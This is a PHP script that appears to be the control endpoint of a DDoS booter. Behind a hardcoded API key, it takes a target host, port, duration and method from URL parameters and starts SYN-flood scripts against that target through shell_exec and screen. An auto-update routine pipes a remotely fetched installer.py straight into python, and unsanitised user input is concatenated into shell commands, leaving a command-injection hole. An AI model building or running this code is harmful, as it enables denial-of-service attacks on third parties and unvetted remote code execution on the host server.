<?php
ignore_user_abort(true);
set_time_limit(0);

// UPDATER
$update = false;
$remote_version = file_get_contents('https://raw.githubusercontent.com/xIvan0ff/ethereal-installer/main/version.txt');
if (file_exists('version.txt')) {
    $current_version = file_get_contents('version.txt');
    if (empty($remote_version)) {
        echo ("No connection to GitHub, ignoring version check");
    } else
    if (version_compare($remote_version, $current_version) > 0) {
        $update = true;
    } else if (version_compare($remote_version, $current_version) < 0) {
        die("Remote version: $remote_version<br>Current version: $current_version<br>Local version corrupted. Forcing update.<br>");
        $update = true;
    }
} else {
    $update = true;
}

if ($update) {
    shell_exec('wget -qO- https://raw.githubusercontent.com/xIvan0ff/ethereal-installer/main/installer.py | python -');
    echo ("Updated to version $remote_version.<br>");
}

$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];

$directory = "REPLACEME";
$array = array("syn", "synpy", "stop");
$ray = array("etherealhehe");


if (!empty($key)) {
} else {
    die('Error: API key is empty!');
}

if (in_array($key, $ray)) {
} else {
    die('Error: Incorrect API key!');
}


if (!empty($time)) {
} else {
    die('Error: time is empty!');
}


if (!empty($host)) {
} else {
    die('Error: Host is empty!');
}

if (!empty($port)) {
} else {
    die('Error: Port is empty!');
}


if (!empty($method)) {
} else {
    die('Error: Method is empty!');
}


if (in_array($method, $array)) {
} else {
    die('Error: The method you requested does not exist!');
}


if ($port > 44405) {
    die('Error: Ports over 44405 do not exist');
}

// if (ctype_digit($time)) {
//     die('Error: Time is not in numeric form!');
// }

// if (ctype_digit($port)) {
//     die('Error: Port is not in numeric form!');
// }





if ($method == "syn") {
    $command = "screen -dm perl $directory/syn.pl $host $port 55000 $time";
}
if ($method == "synpy") {
    $command = "screen -dm py $directory/syn.py $host $port 55000 $time";
}
if ($method == "stop") {
    $command = "pkill $host -f";
}

$output = shell_exec($command . " 2>&1");
die(nl2br("Output:\n$output\nCommand executed:\n$command"));
